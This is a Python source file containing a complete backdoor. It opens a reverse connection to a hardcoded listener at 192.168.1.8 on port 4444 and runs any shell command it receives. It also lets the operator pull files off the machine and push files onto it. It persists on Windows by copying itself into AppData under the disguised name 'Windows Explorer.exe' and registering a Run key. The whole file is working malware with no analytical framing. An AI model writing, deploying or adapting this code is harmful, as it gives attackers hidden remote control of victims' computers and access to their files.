#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistant()
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def reliable_recieve(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def reliable_send(self, data):
        try:
            data = data.decode()
        except:
            pass
        json_data = json.dumps(data).encode('utf-8')
        self.connection.send(json_data)

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+]Changing working directory to " + path

    def read_file(self, path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self,path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+]upload Successful"

    def run(self):
        while True:
            command = self.reliable_recieve()
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == 'download':
                    command_result = self.read_file(command[1])
                elif command[0] == 'upload':
                    command_result = self.write_file(command[1],command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-]Error during command execution..."
            self.reliable_send(command_result)

    def become_persistant(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "{evil_file_location}"', shell=True)

try:
    my_backdoor = Backdoor("192.168.1.8", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()